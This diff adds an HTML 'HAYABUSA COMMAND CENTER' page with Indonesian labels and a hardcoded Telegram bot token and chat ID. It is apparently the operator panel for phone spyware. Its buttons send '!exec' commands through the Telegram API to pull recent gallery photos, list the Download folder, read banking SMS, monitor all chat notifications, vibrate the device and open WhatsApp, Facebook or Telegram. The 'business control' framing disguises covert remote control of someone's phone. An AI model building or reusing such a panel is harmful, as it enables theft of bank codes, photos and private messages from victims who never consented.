@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HAYABUSA BUSINESS CONTROL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; text-align: center; }
+        .section { border: 1px solid #30363d; border-radius: 8px; margin: 15px; padding: 10px; background: #161b22; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
+        button { 
+            padding: 12px; border: 1px solid #30363d; border-radius: 6px; background: #21262d; 
+            color: #c9d1d9; cursor: pointer; font-size: 13px; transition: 0.3s;
+        }
+        button:hover { background: #30363d; border-color: #8b949e; }
+        button:active { background: #58a6ff; color: #fff; }
+        h3 { font-size: 14px; text-transform: uppercase; color: #8b949e; margin-bottom: 10px; }
+        .status { color: #238636; font-size: 11px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <h2>🚀 HAYABUSA COMMAND CENTER</h2>
+    <div class="status" id="log">Sistem Online - Ready for Work</div>
+
+    <div class="section">
+        <h3>🎮 Remote Control</h3>
+        <div class="grid">
+            <button onclick="sendCommand('vibrate')">📳 Getar HP</button>
+            <button onclick="sendCommand('tts')">🗣️ Kirim Suara</button>
+            <button onclick="sendCommand('battery')">🔋 Sisa Baterai</button>
+            <button onclick="sendCommand('toast')">💬 Pesan Layar</button>
+        </div>
+    </div>
+
+    <div class="section">
+        <h3>📂 Business & Files</h3>
+        <div class="grid">
+            <button onclick="sendCommand('gallery')">🖼️ Tarik Foto Terbaru</button>
+            <button onclick="sendCommand('list_download')">📥 Cek Folder Download</button>
+            <button onclick="sendCommand('sms')">💳 Cek SMS Banking</button>
+            <button onclick="sendCommand('notif')">🔔 Pantau Semua Chat</button>
+        </div>
+    </div>
+
+    <div class="section">
+        <h3>🌐 Apps Trigger</h3>
+        <div class="grid">
+            <button onclick="sendCommand('open_wa')">🟢 Buka WhatsApp</button>
+            <button onclick="sendCommand('open_fb')">🔵 Buka Facebook</button>
+            <button onclick="sendCommand('open_tele')">✈️ Buka Telegram</button>
+            <button onclick="sendCommand('open_fm')">📁 Buka File Manager</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
+        const CHAT_ID = "7596509818";
+
+        function sendCommand(cmd) {
+            document.getElementById('log').innerText = "Processing: " + cmd;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `!exec ${cmd}`
+                })
+            }).then(() => {
+                document.getElementById('log').innerText = "Command " + cmd + " Sent!";
+            });
+        }
+    </script>
+</body>
+</html>
